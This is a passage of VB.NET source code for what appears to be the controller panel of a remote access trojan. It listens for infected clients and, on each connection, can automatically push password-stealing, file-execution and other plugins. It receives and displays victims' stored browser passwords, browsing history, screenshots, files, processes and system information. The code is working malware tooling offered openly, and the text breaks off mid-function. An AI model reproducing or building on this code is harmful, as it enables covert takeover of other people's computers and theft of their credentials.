Imports System.ComponentModel
Imports System.IO
Imports System.Net
Imports System.Net.Sockets
Imports System.Media
Imports System.Runtime.InteropServices
Imports System.Runtime.Serialization.Formatters.Binary
Imports System.Text
Imports System.Threading
Imports Microsoft.VisualBasic.Devices
''||       AUTHOR Arsium       ||
''||       github : https://github.com/arsium       ||
Public Class Form1
    <DllImport("ntdll.dll")>
    Public Shared Function NtTerminateProcess(ByVal hfandle As IntPtr, ByVal ErrorStatus As Integer) As UInteger
    End Function
    Declare Function SetProcessWorkingSetSize Lib "kernel32.dll" (ByVal process As IntPtr, ByVal minimumWorkingSetSize As Integer, ByVal maximumWorkingSetSize As Integer) As Integer
    <DllImport("psapi")>
    Public Shared Function EmptyWorkingSet(ByVal hfandle As IntPtr) As Boolean
    End Function
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Me.Close()
    End Sub
    Protected Overrides Sub WndProc(ByRef m As Message)

        Select Case m.Msg > 0

            Case m.Msg = &H10

                Dim n As Process = Process.GetCurrentProcess

                NtTerminateProcess(n.Handle, 0)

        End Select

        MyBase.WndProc(m)

    End Sub

    Public Sub ClearMemory()
        While True
            GC.Collect()
            Task.Run(Sub() GC.WaitForPendingFinalizers())
            SetProcessWorkingSetSize(Process.GetCurrentProcess().Handle, -1, -1)
            EmptyWorkingSet(Process.GetCurrentProcess.Handle)
            Thread.Sleep(2500)
        End While
    End Sub
    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Me.WindowState = FormWindowState.Maximized
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        Me.WindowState = FormWindowState.Normal
    End Sub

    Private Async Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        '    Log_Form.Show()
        Timer2.Start()
        MKWFGA.Animations.Animation(Me.Handle, 1000, MKWFGA.Animations.AnimtedFlags.Blend)
        Task.Run(Sub() ClearMemory())
    End Sub
    Private Sub AboutToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AboutToolStripMenuItem.Click
        ABTForm.Show()
    End Sub

    Private Sub UcBtnExt2_BtnClick_1(sender As Object, e As EventArgs) Handles UcBtnExt2.BtnClick
        ABTForm.Show()
    End Sub

    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
        Label2.Text = DateTime.Now.TimeOfDay.Hours & ":" & DateTime.Now.TimeOfDay.Minutes & ":" & DateTime.Now.TimeOfDay.Seconds
    End Sub





#Region "Viewer"' OLD"


    Public RDPViewer As TcpListener

    Public Sub GetRDVClient()

        While True

            Dim op As TcpClient = RDPViewer.AcceptTcpClient

            Task.Run(Sub() RD(op.GetStream(), op.Client.RemoteEndPoint.ToString))



        End While
    End Sub

    Public Sub RD(ByVal lp As NetworkStream, ByVal id As String)
        Dim foorm As New RViewerForm
        foorm.Label4.Text = AeroListView1.SelectedItems(0).Text
        foorm.Text = AeroListView1.SelectedItems(0).Text

        Dim h As New Thread(Sub() Application.Run(foorm))

        h.Start()

        Dim bf As New BinaryFormatter

        Try

            While True

                Dim ui As Image = bf.Deserialize(lp)
                '"|R|"

                ' Dim Buffer(1024 * 500) As Byte
                '  Dim lu As Integer = lp.Read(Buffer, 0, Buffer.Length)

                'If lu > 0 Then


                'Dim Message As String = Encoding.Default.GetString(Buffer, 0, lu)

                '  Dim o = Message.Replace("|R|", "")

                '  Dim IM As Byte() = Encoding.Default.GetBytes(o)

                '  Dim MM = New IO.MemoryStream(IM)



                foorm.PictureBox1.Image = ui

                    '    End If




                    GC.Collect()
                GC.WaitForPendingFinalizers()

            End While


        Catch ex As Exception
            Exit Sub
            h.Abort()

        End Try
    End Sub
#End Region



    Private serve As TcpListener

    Public Shared CliSt As List(Of TcpClient)

    Private Async Sub UcBtnExt1_BtnClick(sender As Object, e As EventArgs) Handles UcBtnExt1.BtnClick

        If UcBtnExt1.BtnText = "Listen !" Then

            serve = New TcpListener(IPAddress.Any, NumericUpDown1.Value)

            CliSt = New List(Of TcpClient)


            serve.Start()

            Dim Context As TaskScheduler = TaskScheduler.FromCurrentSynchronizationContext()


            Task.Factory.StartNew(Sub() AcceptAndRead(Context), CancellationToken.None, TaskCreationOptions.LongRunning)

            '   o.Start()

            RDPViewer = New TcpListener(IPAddress.Any, NumericUpDown2.Value)

            RDPViewer.Start()



            Task.Run(Sub() GetRDVClient())


            '  Timer1.Start()

            UcBtnExt1.BtnText = "Started !"

            '


        Else



            CliSt.Clear()

            serve.Stop()


            AeroListView1.Items.Clear()

            CliSt.Clear()


            RDPViewer.Stop()

            UcBtnExt1.BtnText = "Listen !"


        End If

    End Sub


#Region "Auto Plugins"
    Public Sub AUTOPLG(ByVal TcpCli As TcpClient)

        Thread.Sleep(1500)

        If Auto_RECOV.Checked = True Then

            Dim o As String = PL_PW & "|SP1|" & "|SP2|" & "|RCN|" & "|ENDING|"
            Dim B As Byte() = Encoding.Default.GetBytes(o)
            Task.Run(Sub() TcpCli.GetStream.WriteAsync(B, 0, B.Length))

        End If

        Thread.Sleep(1000)


        If AUTO_CHK_FILE.Checked Then

            Dim o As String = PL_IJCT & "|SP1|" & "" & "|SP2|" & "|EXE|" & "|SP2|" & FILETOEXEC & "|ENDING|"
            Dim B As Byte() = Encoding.Default.GetBytes(o)
            Task.Run(Sub() TcpCli.GetStream.WriteAsync(B, 0, B.Length))

        End If

        Thread.Sleep(1000)

        If AUTO_ATS.Checked Then

            Dim o As String = PL_MISC & "|SP1|" & "" & "|SP2|" & "|ATSRP|" & "|ENDING|"
            Dim B As Byte() = Encoding.Default.GetBytes(o)
            Task.Run(Sub() TcpCli.GetStream.WriteAsync(B, 0, B.Length))

        End If

    End Sub
#End Region
    Public Async Sub AcceptAndRead(ByVal Context As TaskScheduler)

        Try

            While (True)

                Dim TcpCLI As TcpClient = serve.AcceptTcpClient

                Task.Run(Sub() Logs_Helper.Log(LG.LOG_AeroListView2, TcpCLI.Client.RemoteEndPoint.ToString & "||" & "Connected !"))

                CliSt.Add(TcpCLI)

                Dim S As Stream = My.Resources.me_too

                Dim snd As System.Media.SoundPlayer = New System.Media.SoundPlayer(S)

                snd.Play()

                Task.Run(Sub() SenderHelper.SenderHelper(CliSt, TcpCLI.Client.RemoteEndPoint.ToString, "|GETID|"))

                Dim DATA As New StringBuilder

                Task.Run(Sub() CheckClient(TcpCLI))

                Task.Run(Sub() RD(TcpCLI, Context, TcpCLI.Client.RemoteEndPoint.ToString, DATA))

                ' Dim h As New Thread(Sub() AUTOPLG(TcpCLI))
                Task.Run(Sub() AUTOPLG(TcpCLI))
                '  h.Start()

            End While

        Catch ex As Exception

            Exit Sub

        End Try
    End Sub

#Region "Client Checker"
    Public Shared TestBytes As Byte() = Encoding.Default.GetBytes("")
    Public Async Sub CheckClient(ByVal k As TcpClient)
        While True

            Thread.Sleep(1000)

            Try
                '   Await Task.Run(Sub() k.GetStream.WriteAsync(TestBytes, 0, TestBytes.Length))
                Await k.GetStream.WriteAsync(TestBytes, 0, TestBytes.Length)

            Catch ex As Exception
                '  For Each az As ListViewItem In AeroListView1.Items
                For Each Cli As TcpClient In CliSt

                    If Cli.Client.RemoteEndPoint.ToString = k.Client.RemoteEndPoint.ToString Then

                        Try

                            For Each h As ListViewItem In AeroListView1.Items

                                If h.Text = Cli.Client.RemoteEndPoint.ToString Then

                                    AeroListView1.Items.Remove(h)

                                End If

                            Next
                            '.Remove(AeroListView1.SelectedItems(0))
                        Catch exS As Exception

                        End Try

                        Task.Run(Sub() Logs_Helper.Log(LG.LOG_AeroListView2, k.Client.RemoteEndPoint.ToString & "||" & "Disconnected !"))

                        CliSt.Remove(k)

                        Exit Sub

                    End If
                Next

            End Try

        End While
    End Sub
#End Region
    Private Async Sub RD(ByVal stream As TcpClient, ByVal context As TaskScheduler, ByVal id As String, ByVal STBDATA As StringBuilder)
        ''

        Dim foorm As New RViewerForm
        ' foorm.Label4.Text = id
        Dim VT As New Thread(Sub() Application.Run(foorm))
        Dim FM1 As New FileManager_Form
        Dim TASK1 As New Tasks_Form
        Dim INFO1 As New Info_Form
        '  Dim PPPP As New Thread(Sub() Application.Run(foorm))


        'PPPP.Start()
        Dim StringHelper As New StringBuilder

        While True

            Try

                Dim Buffer(2500 * 4096) As Byte

                Dim READ As Integer = stream.GetStream.Read(Buffer, 0, Buffer.Length)

                '' Dim Reader As New StreamWriter(stream.GetStream())
                '' Reader.WriteAsync(Message)

                If READ > 0 Then
                    Try


                        Dim Message As String = Encoding.Default.GetString(Buffer, 0, READ)

                        '   If Message.Contains("|FSTK|") Then
                        '  StringHelper.Append(Message)

                        '  If StringHelper.ToString.Contains("|ENDW|") Then
                        '     IO.File.WriteAllText("Test.txt", StringHelper.ToString)


                        '     StringHelper.Clear()

                        '  End If
                        '  End If


                        STBDATA.Append(Message)


                        If STBDATA.ToString.EndsWith("|IDDEND|") Then

                            Task.Run(Sub() Logs_Helper.Log(LG.LOG_AeroListView2, id & "||" & "Got ID !"))
                            Try


                                ' Dim j As String = Encoding.UTF8.GetString(Buffer, 0, READ)

                                Dim j As String = Encoding.UTF8.GetString(Encoding.Default.GetBytes(STBDATA.ToString))

                                STBDATA.Clear()

                                Dim rhejk As String() = Split(j.Replace("|IDDEND|", ""), "|IDD|")
                                Countries.GetFlags(id, ImageList1, AeroListView1, rhejk)

                            Catch ex As Exception

                            End Try

                        ElseIf STBDATA.ToString.EndsWith("|ENDW|") Then

                            Dim UTF8 As String = Encoding.UTF8.GetString(Encoding.Default.GetBytes(STBDATA.ToString))


                            STBDATA.Clear()

                            Dim h As String = UTF8.Replace("|ENDW|", "")




                            Dim aze As New Thread(Sub() B64DW(h, id))

                            aze.Start()
                            '



                        ElseIf STBDATA.ToString.EndsWith("|FPWD|") Then

                            Dim a As New PassRecov_Form

                            Dim j As String = Encoding.UTF8.GetString(Encoding.Default.GetBytes(STBDATA.ToString))

                            STBDATA.Clear()

                            Dim k As String() = Split(j, "|GPWD|")



                            '  l.Clear()


                            Dim k2 As String() = Split(k(0), Environment.NewLine)


                            Task.Run(Sub() SetPasswords(k2, id, a, k, k(1)))







                        ElseIf STBDATA.ToString.EndsWith("|HTWB|") Then

                            Dim o As New Thread(Sub() History_Helper(Buffer, READ, id))

                            o.Start()

                            '  Dim A As New Hist_Form

                            ' Dim j As String = Encoding.UTF8.GetString(Buffer, 0, lu)
                            '
                            ' Dim k2 As String() = Split(j.Replace("|HTWB|", ""), Environment.NewLine)


                            '  Task.Run(Sub() SetHistory(k2, id, A))



                        ElseIf STBDATA.ToString.EndsWith("|VOL|") Then


                            Task.Run(Sub() Logs_Helper.Log(LG.LOG_AeroListView2, id & "||" & "File Manager Started !"))

                            FM1 = New FileManager_Form



                            Dim j As String = Encoding.UTF8.GetString(Encoding.Default.GetBytes(STBDATA.ToString))

                            STBDATA.Clear()


                            Dim o As String() = Split(j.Replace("|VOL|", ""), Environment.NewLine)

                            For i = 0 To o.Length - 2

                                FM1.ComboBox1.Items.Add(o(i))

                            Next
                            FM1.Label4.Text = id
                            FM1.ComboBox1.Text = o(0)
                            FM1.Label1.Text = o(0)


                            AddHandler FM1.ComboBox1.SelectedIndexChanged, Sub() ComBoBoxHandler(FM1.ComboBox1, FM1)
                            Dim aj As New Thread(Sub() Application.Run(FM1))
                            aj.Start()








                        ElseIf Message.Contains("/\ENDFM/\") Then



                            Dim j As String = Encoding.UTF8.GetString(Encoding.Default.GetBytes(STBDATA.ToString))

                            STBDATA.Clear()

                            Dim az As String() = Split(j, "|FILES|")
                            '  l.Clear()


                            Task.Run(Sub() SetFM(az, FM1))


                            '  STBDATA.Clear()

                        ElseIf STBDATA.ToString.EndsWith("|DELTRUE|") Then



                            Dim j As String = Encoding.UTF8.GetString(Encoding.Default.GetBytes(STBDATA.ToString))

                            STBDATA.Clear()
                            Dim b As String = j.Replace("|DELTRUE|", "")

                            Task.Run(Sub() Logs_Helper.Log(LG.LOG_AeroListView2, id & "||" & "File named  : " & "''" & b & "''" & " has been deleted !"))

                            '  l.Clear()
                            Task.Run(Sub() DeleteFile(b, FM1, id))

                        ElseIf STBDATA.ToString.EndsWith("|DELFALSE|") Then



                            Dim j As String = Encoding.UTF8.GetString(Encoding.Default.GetBytes(STBDATA.ToString))

                            STBDATA.Clear()
                            Dim b As String = j.Replace("|DELFALSE|", "")

                            Task.Run(Sub() Logs_Helper.Log(LG.LOG_AeroListView2, id & "||" & "File named  : " & "''" & b & "''" & " couldn't be deleted !"))


                            ' Task.Run(Sub() DeleteFileFailed(b, FM1))



                        ElseIf STBDATA.ToString.EndsWith("|OPENTRUE|") Then



                            Dim j As String = Encoding.UTF8.GetString(Encoding.Default.GetBytes(STBDATA.ToString))

                            STBDATA.Clear()
                            Dim h As String = j.Replace("|OPENTRUE|", "")


                            '  l.Clear()


                            Task.Run(Sub() Logs_Helper.Log(LG.LOG_AeroListView2, id & "||" & "File named " & "''" & h & "''" & " has been opened !"))

                            Task.Run(Sub() OpenFile(h))

                        ElseIf STBDATA.ToString.EndsWith("|OPENFALSE|") Then


                            Dim j As String = Encoding.UTF8.GetString(Encoding.Default.GetBytes(STBDATA.ToString))

                            STBDATA.Clear()
                            Dim h As String = j.Replace("|OPENFALSE|", "")
                            '    l.Clear()

                            Task.Run(Sub() Logs_Helper.Log(LG.LOG_AeroListView2, id & "||" & "File named  " & "''" & h & "''" & " couldn't be opened !"))

                            Task.Run(Sub() OpenFileFailed(h))


                        ElseIf STBDATA.ToString.EndsWith("|TASKF|") Then

                            Dim j As String = Encoding.UTF8.GetString(Encoding.Default.GetBytes(STBDATA.ToString))

                            STBDATA.Clear()
                            TASK1 = New Tasks_Form
                            Dim h As String = j.Replace("|TASKF|", "")

                            '  l.Clear()

                            Dim h2 As String() = Split(h, Environment.NewLine)




                            TASK1.Label4.Text = id

                            Task.Run(Sub() SetTask(h2, TASK1))



                        ElseIf STBDATA.ToString.EndsWith("|TASKF||OLD|") Then
                            Dim UTF8 As String = Encoding.UTF8.GetString(Encoding.Default.GetBytes(STBDATA.ToString))

                            STBDATA.Clear()
                            Dim h As String = UTF8.Replace("|TASKF||OLD|", "")

                            '   l.Clear()

                            Dim h2 As String() = Split(h, Environment.NewLine)




                            TASK1.Label4.Text = id

                            Task.Run(Sub() SetTask(h2, TASK1))


                            'RK


                        ElseIf STBDATA.ToString.EndsWith("|RK|") Then


                            Dim UTF8 As String = Encoding.UTF8.GetString(Encoding.Default.GetBytes(STBDATA.ToString))

                            STBDATA.Clear()
                            Dim h As String = UTF8.Replace("|RK|", "")

                            '   l.Clear()

                            Dim h2 As String() = Split(h, "|/\|")





                            Task.Run(Sub() KT(h2, TASK1))










                        ElseIf STBDATA.ToString.EndsWith("|INFOSYST|") Then

                            Dim j As String = Encoding.UTF8.GetString(Encoding.Default.GetBytes(STBDATA.ToString))

                            STBDATA.Clear()

                            Task.Run(Sub() Logs_Helper.Log(LG.LOG_AeroListView2, id & "||" & "Get System Information !"))

                            Dim o As String = j.Replace("|INFOSYST|", "")


                            ' l.Clear()
                            INFO1 = New Info_Form

                            INFO1.Label4.Text = id

                            Task.Run(Sub() SetInformation(INFO1, o, id))



                        ElseIf Message.StartsWith("|DESK|") Then




                            ' If VT.ThreadState = ThreadState.Running Then

                            'Try
                            'Dim o As String() = Split(Message, "|SP|")
                            ' Dim MM = New IO.MemoryStream(Encoding.Default.GetBytes(o(1)))



                            ' Dim iii As Image = bf.Deserialize(MM)

                            '      Task.Run(Sub() SetImage(foorm.PictureBox1, o(1)))
                            '               '    'foorm.PictureBox1.Image = Image.FromStream(MM)
                            'iii
                            'Image.FromStream(MM)

                            'MM.Dispose()
                            'GC.Collect()
                            '  GC.WaitForPendingFinalizers()
                            '    Catch ex As Exception
                            '   VT.Abort()

                            'End Try

                            'Else
                            '    foorm.Label4.Text = AeroListView1.SelectedItems(0).Text
                            '       foorm.Text = AeroListView1.SelectedItems(0).Text
                            '   VT.Start()
                            'End If

                            '  GC.Collect()
                            '    GC.WaitForPendingFinalizers()



                        ElseIf STBDATA.ToString.EndsWith("|STPDSK|") Then

                            foorm = New RViewerForm

                            VT = New Thread(Sub() Application.Run(foorm))

                        ElseIf STBDATA.ToString.EndsWith("|ENDPROCINFO|") Then

                            Dim UTF8 As String = Encoding.UTF8.GetString(Encoding.Default.GetBytes(STBDATA.ToString))

                            STBDATA.Clear()
                            Dim Data As String = UTF8.Replace("|ENDPROCINFO|", "")

                            Task.Run(Sub() SetPROCINFO(Data, id))



                        ElseIf STBDATA.ToString.EndsWith("|RES|") Then

                            Dim UTF8 As String = Encoding.UTF8.GetString(Encoding.Default.GetBytes(STBDATA.ToString))

                            STBDATA.Clear()
                            Dim Data As String = UTF8.Replace("|RES|", "")


                            Task.Run(Sub() Logs_Helper.Log(LG.LOG_AeroListView2, id & "||" & "Process : " & Data & " has been resume !"))


                        ElseIf STBDATA.ToString.EndsWith("|SUS|") Then

                            Dim UTF8 As String = Encoding.UTF8.GetString(Encoding.Default.GetBytes(STBDATA.ToString))

                            STBDATA.Clear()
                            Dim Data As String = UTF8.Replace("|SUS|", "")

                            Task.Run(Sub() Logs_Helper.Log(LG.LOG_AeroListView2, id & "||" & "Process : " & Data & " has been suspended !"))


                        ElseIf STBDATA.ToString.EndsWith("CRYPTO|") Then

                            Dim Chk As New Thread(Sub() EncDecChecker(Message))

                            Chk.Start()


                        ElseIf STBDATA.ToString.EndsWith("|MTB|") Then

                            Dim UTF8 = Encoding.UTF8.GetString(Encoding.Default.GetBytes(STBDATA.ToString))

                            STBDATA.Clear()

                            Dim Chk As New Thread(Sub() MTBCheck(UTF8, id, FM1))

                            Chk.Start()


                        ElseIf STBDATA.ToString.EndsWith("|FI|") Then

                            Dim UTF8 = Encoding.UTF8.GetString(Encoding.Default.GetBytes(STBDATA.ToString))

                            STBDATA.Clear()

                            Dim Set_FI As New Thread(Sub() SetFI(UTF8, id))

                            Set_FI.Start()

                        End If

                    Catch ss As Exception
                    End Try


                End If



                ' Else
                '


                '   End If
            Catch ex As Exception
                Exit Sub
            End Try

        End While



    End Sub
    Public Sub SetImage(ByVal P As PictureBox, ByVal l As String)
        ' Dim pazeza As Byte() = Await Task.Run(Function() Encoding.Default.GetBytes(l))
        Dim pazeza As Byte() = Encoding.Default.GetBytes(l)
        Dim MM = New IO.MemoryStream(pazeza)


        ' Dim iii As Image = bf.Deserialize(MM)


        P.Image = Image.FromStream(MM)
    End Sub
    ''|| OLD CLIENT CHECKER ||

    ' Private Sub Timer1_Tick(sender As Object, e As EventArgs)
    'Dim uiok As Byte() = Encoding.Default.GetBytes("")
    'Dim klm As New TcpClient



    '  Try

    'For Each iaze As TcpClient In CliSt

    '           klm = iaze
    '          iaze.GetStream.Write(uiok, 0, uiok.Length)

    '  Next

    'Catch ex As Exception
    'For Each az As ListViewItem In AeroListView1.Items
    'If az.Text = klm.Client.RemoteEndPoint.ToString Then
    '                 AeroListView1.Items.Remove(az)
    '               CliSt.Remove(klm)

    '  End If
    'Next
    ' End Try


    '  End Sub

#Region "Tasks Manager Helper"
    Public Sub SetTask(ByVal az As String(), ByVal TASK1 As Tasks_Form)
        '|IC|



        Dim t As Task = Task.Run(Sub() TASK1.ListView1.Items.Clear())



        t.Wait()

        Dim ImageList = New ImageList()
        ImageList.ColorDepth = ColorDepth.Depth32Bit


        ImageList.ImageSize = New Size(32, 32)

        TASK1.ListView1.SmallImageList = ImageList


        Dim x As Integer = 0

        For i = 0 To az.Length - 2


            Dim h As String() = Split(az(i), "|IC|")


            If h(1).Length > 0 Then

                Dim o As Bitmap = BytesToImage(Convert.FromBase64String(h(1)))




                ImageList.Images.Add(x, o)

                Dim listViewItem = TASK1.ListView1.Items.Add(h(0))
                listViewItem.ImageKey = x
                x += 1
                ' Dim listViewItem = TASK1.ListView1.Items.Add(az(i))
                '   listViewItem.Tag = ""
                ' listViewItem.ImageKey = x

            Else

                Dim B As Bitmap = My.Resources.imageres_15.ToBitmap
                ImageList.Images.Add(x, B)


                Dim listViewItem = TASK1.ListView1.Items.Add(h(0))

                listViewItem.ImageKey = x
                x += 1




            End If






        Next

        TASK1.ListView1.Sorting = SortOrder.Ascending
        TASK1.ListView1.Sort()

        Dim Thread_Form As New Thread(Sub() Application.Run(TASK1))
        Thread_Form.Start()




    End Sub

    Public Sub KT(ByVal az As String(), ByVal TASK1 As Tasks_Form)
        Dim bConv As Integer

        If Integer.TryParse(az(0), bConv) = True Or az(0) = "False" Then

            MessageBox.Show("Something went wrong on the killing task for : " & az(1))
        Else

            Try

                For Each u As ListViewItem In TASK1.ListView1.Items
                    If u.Text = az(1) Then
                        TASK1.ListView1.Items.Remove(u)
                    End If

                Next
            Catch ex As Exception

            End Try

        End If
    End Sub


    Public Async Sub SetPROCINFO(ByVal DATA As String, ByVal ID As String)
        Dim PF As New ProcInfo_Form


        Dim nhgopl As String() = Split(DATA, "|/\|")

        PF.RichTextBox1.Text = nhgopl(0)



        PF.RichTextBox2.Text = nhgopl(1)



        PF.RichTextBox3.Text = nhgopl(2)


        PF.RichTextBox4.Text = nhgopl(3)

        PF.RichTextBox5.Text = nhgopl(4)


        PF.RichTextBox6.Text = nhgopl(5)


        PF.RichTextBox7.Text = nhgopl(6)


        PF.Label1.Text = nhgopl(7)



        Task.Run(Sub() Logs_Helper.Log(LG.LOG_AeroListView2, ID & "||" & "Got information about process : " & nhgopl(7)))

        Application.Run(PF)

    End Sub
#End Region

#Region "File Manager Helper"

    Public Sub SetFI(ByVal FI As String, ByVal ID As String)

        Dim Fi_F As New FileInfo_Form
        Dim SP As String() = Split(FI.Replace("|FI|", ""), "||")
        Fi_F.RichTextBox1.Text = SP(0)

        Fi_F.RichTextBox2.Text = SP(1)
        Fi_F.RichTextBox3.Text = SP(2)
        Fi_F.Label1.Text = SP(3)

        Dim j As New Thread(Sub() Application.Run(Fi_F))

        Task.Run(Sub() Logs_Helper.Log(LG.LOG_AeroListView2, ID & "||" & "Got Information for file at : " & SP(3)))

        j.Start()
    End Sub
    Public Sub MTBCheck(ByVal P As String, ByVal ID As String, ByVal FM1 As FileManager_Form)




        Dim SP As String() = Split(P, "|")


        If SP(1) = "D" Then

            Task.Run(Sub() Logs_Helper.Log(LG.LOG_AeroListView2, ID & "||" & "The File at : " & SP(0) & " has been moved to recycle bin !"))

            For Each h As ListViewItem In FM1.ListView1.Items
                If SP(0).Contains(h.Text) Then
                    h.Remove()
                End If
            Next

        ElseIf SP(1) = "F" Then



            Task.Run(Sub() Logs_Helper.Log(LG.LOG_AeroListView2, ID & "||" & "The File at : " & SP(0) & " couldn't be moved to recycle bin !"))
        End If
    End Sub
    Public Async Sub B64DW(ByVal K As String, ByVal ID As String)
        Try

            Dim o As String() = Split(K, "|DW|")

            Dim h As New Thread(Sub() GetFile(o(0), o(1), ID))
            h.Start()
        Catch ex As Exception

        End Try


    End Sub
    Public Async Sub GetFile2(ByVal B64 As String, ByVal Name As String, ByVal ID As String)

        MessageBox.Show("Data of file : " & Name & "have been downloaded ! Now they will be written !")
        Try


            Dim h As Byte() = Await Task.Run(Function() Encoding.Default.GetBytes(B64))

            IO.File.WriteAllBytes(Name, h)


            GC.Collect()
            GC.WaitForPendingFinalizers()

            Task.Run(Sub() Logs_Helper.Log(LG.LOG_AeroListView2, ID & "||" & "File : " & Name & " has been downloaded !"))
        Catch ex As Exception
            MessageBox.Show("Something went wrong with those data !")
        End Try

    End Sub

    Public Async Sub GetFile(ByVal B64 As String, ByVal Name As String, ByVal ID As String)

        MessageBox.Show("Data of file : " & Name & "have been downloaded ! Now they will be written !")
        Try


            Dim h As Byte() = Await Task.Run(Function() Convert.FromBase64String(B64))

            IO.File.WriteAllBytes(Name, h)


            GC.Collect()
            GC.WaitForPendingFinalizers()

            Task.Run(Sub() Logs_Helper.Log(LG.LOG_AeroListView2, ID & "||" & "File : " & Name & " has been downloaded !"))
        Catch ex As Exception
            MessageBox.Show("Something went wrong with those data !")
        End Try

    End Sub
    Public Async Sub ComBoBoxHandler(ByVal l As ComboBox, ByVal P As FileManager_Form)

        Dim o As String = PL_FM & "|SP1|" & "" & "|SP2|" & "|NO|" & "|SP2|" & l.Text & "|ENDING|"

        P.Label1.Text = l.Text

        Await Task.Run(Sub() SenderHelper.SenderHelper(Form1.CliSt, P.Label4.Text, o))

    End Sub



    Public Sub SetFM(ByVal az As String(), ByVal FM1 As FileManager_Form)

        Dim t As Task = Task.Run(Sub() FM1.ListView1.Clear())



        t.Wait()
        Dim ImageList = New ImageList()
        ImageList.ColorDepth = ColorDepth.Depth32Bit


        ImageList.ImageSize = New Size(32, 32)

        FM1.ListView1.LargeImageList = ImageList

        Dim Files As String() = Split(az(0), vbCrLf)


        Dim x As Integer = 0

        Dim Folders As String() = Split(az(1), vbCrLf)

        For i = 0 To Folders.Length - 2


            ImageList.Images.Add(x, My.Resources.folder)




            Dim listViewItem = FM1.ListView1.Items.Add(Folders(i))
            listViewItem.Tag = "FOLDER"
            listViewItem.ImageKey = x

        Next
        x += 1

        For Each u As String In Files


            Dim h As String() = Split(u, "|IC|")


            Dim o As Bitmap = BytesToImage(Convert.FromBase64String(h(1)))




            ImageList.Images.Add(x, o)


            Dim listViewItem = FM1.ListView1.Items.Add(h(0))
            listViewItem.Tag = "FILE"
            listViewItem.ImageKey = x
            x += 1

        Next
        ' FM1.ListView1.Sorting = SortOrder.Ascending
        '   FM1.ListView1.Sort()


    End Sub

    Public Function ImageToBytes(ByVal img As Image) As Byte()
        Using mStream As New MemoryStream()
            img.Save(mStream, img.RawFormat)
            Return mStream.ToArray()
        End Using
    End Function

    Public Function BytesToImage(ByVal Bytesss As Byte()) As Image
        Using mStream As New MemoryStream(Bytesss)
            Return Image.FromStream(mStream)
        End Using
    End Function
    Public Sub DeleteFileFailed(ByVal FileName As String, ByVal FM1 As FileManager_Form)
        MessageBox.Show("Could not delete file named : " & FileName)
    End Sub
    Public Sub DeleteFile(ByVal FileName As String, ByVal FM1 As FileManager_Form, ByVal ID As String)
        For Each h As ListViewItem In FM1.ListView1.Items
            If h.Text = FileName Then
                h.Remove()
            End If
        Next


        Task.Run(Sub() Logs_Helper.Log(LG.LOG_AeroListView2, ID & "||" & "File : " & FileName & " has been deleted !"))

    End Sub

    Public Sub OpenFile(ByVal F As String)
        MessageBox.Show("The file at : " & F & " has been opened")
    End Sub
    Public Sub OpenFileFailed(ByVal F As String)
        MessageBox.Show("The file at : " & F & " couldn't be opened")
    End Sub
#End Region

#Region "Information Helper"
    Public Sub SetInformation(ByVal F As Info_Form, ByVal j As String, ByVal ID As String)
        For Each h As String In Split(j, vbCrLf)
            F.ListView1.Items.Add(h)
        Next

        Dim Thread_Form As New Thread(Sub() Application.Run(F))


        Task.Run(Sub() Logs_Helper.Log(LG.LOG_AeroListView2, ID & "||" & "Got Information !"))

        Thread_Form.Start()
    End Sub

#End Region

#Region "WebBrowsers Checker"

    Public Sub History_Helper(ByVal Buffer As Byte(), ByVal L As Integer, ByVal ID As String)


        Dim A As New Hist_Form

        Dim j As String = Encoding.UTF8.GetString(Buffer, 0, L)

        Dim k2 As String() = Split(j.Replace("|HTWB|", ""), Environment.NewLine)

        Task.Run(Sub() SetHistory(k2, ID, A))

    End Sub
    Public Sub SetHistory(ByVal HIST_LOG As String(), ByVal ID As String, ByVal a As Hist_Form)



        a.Label1.Text = ID

        Dim kn As ListViewItem


        For Each pk As String In HIST_LOG

            If pk.StartsWith("Application") Then

                kn = New ListViewItem
                Dim Splitter As String = pk.Replace("Application:", "")
                kn.Text = Splitter
            End If



            If pk.StartsWith("Title") Then

                If kn.Text.Length > 0 Then

                    Dim Splitter As String = pk.Replace("Title:", "")
                    kn.SubItems.Add(Splitter)

                End If
            End If

            If pk.StartsWith("URL") Then


                If kn.Text.Length > 0 Then
                    Dim Splitter As String = pk.Replace("URL:", "")
                    kn.SubItems.Add(Splitter)
                End If
            End If


            If pk.StartsWith("LV") Then


                If kn.Text.Length > 0 Then
                    Dim Splitter As String = pk.Replace("LV:", "")
                    kn.SubItems.Add(Splitter)

                    a.ListView1.Items.Add(kn)

                End If


            End If


        Next

        Task.Run(Sub() Logs_Helper.Log(LG.LOG_AeroListView2, ID & "||" & "Successfully recovered history !"))

        Application.Run(a)

    End Sub
    Public Sub SetPasswords(ByVal GPWD As String(), ByVal ID As String, ByVal a As PassRecov_Form, ByVal k As String(), ByVal K3 As String)

        Dim kn As ListViewItem


        For Each pk As String In GPWD

            If pk.StartsWith("Url") Then

                kn = New ListViewItem
                Dim Splitter As String = pk.Replace("Url:", "")
                kn.Text = Splitter
            End If



            If pk.StartsWith("Username") Then

                If kn.Text.Length > 0 Then

                    Dim Splitter As String = pk.Replace("Username:", "")
                    kn.SubItems.Add(Splitter)

                End If
            End If

            If pk.StartsWith("Password") Then


                If kn.Text.Length > 0 Then
                    Dim Splitter As String = pk.Replace("Password:", "")
                    kn.SubItems.Add(Splitter)
                End If
            End If


            If pk.StartsWith("Application") Then


                If kn.Text.Length > 0 Then
                    Dim Splitter As String = pk.Replace("Application:", "")
                    kn.SubItems.Add(Splitter)

                    a.ListView1.Items.Add(kn)

                End If


            End If


        Next


        Dim FPWD As String() = Split(K3.Replace("|FPWD|", ""), Environment.NewLine)


        For i = 0 To FPWD.Length - 2
            Dim FPWD1 As String() = Split(FPWD(i), "|||")
            Dim n As New ListViewItem
            n.Text = " " & FPWD1(1)
            n.SubItems.Add(" " & FPWD1(2))
            n.SubItems.Add(" " & FPWD1(3))
            n.SubItems.Add(" " & FPWD1(0))

            a.ListView1.Items.Add(n)
        Next





        a.Label1.Text = ID

        If XuiCheckBox1.Checked Then
            Static J As New Random
            If IO.Directory.Exists(Application.StartupPath & "\Passwords") Then
